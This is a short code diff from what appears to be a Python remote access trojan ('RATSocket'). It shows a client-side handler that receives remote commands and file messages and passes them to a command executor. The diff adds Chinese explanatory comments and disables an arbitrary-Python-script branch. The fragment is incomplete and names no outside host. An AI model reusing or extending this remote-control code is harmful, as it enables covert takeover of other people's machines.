@@ -3,7 +3,8 @@ import os
 import queue
 from io import BytesIO
 
-from client.util.command import CommandExecutor
+# from client.util.command import CommandExecutor
+from client.util import CommandExecutor
 from common.ratsocket import RATSocket
 from common.util import logger, get_input_stream, get_output_stream, get_time
 
@@ -12,8 +13,12 @@ class Server(RATSocket):
 
     def __init__(self):
         super().__init__()
-        self.command_executor = CommandExecutor(self)
+        self.command_executor = CommandExecutor.CommandExecutor(self) #把服务器的链接传给commandExecutor
+        #初始化的时候只给链接，为什么不给命令ID呢，因为每次执行id都会变，所以要在方法里传
+
         self.command_queue = queue.Queue()
+
+
 
     def send_result(self, id: int, status: int, result: str, eof: int = 1):
         """
@@ -80,13 +85,13 @@ class Server(RATSocket):
         try:
             # 如果是命令
             if type == 'command':
-                result = self.command_executor.execute_command(id, data.get('text'))
+                result = self.command_executor.execute_command(id, data.get('text')) #在这里把收到的命令id传过去
                 if result:
                     return id, *result
 
-            # 如果是Python脚本
-            if type == 'script':
-                return id, *self.command_executor.pyexec(data['text'], kwargs=data.get('extra'))
+            # # 如果是Python脚本
+            # if type == 'script':
+            #     return id, *self.command_executor.pyexec(data['text'], kwargs=data.get('extra'))
 
             # 如果是文件
             if type == 'file':
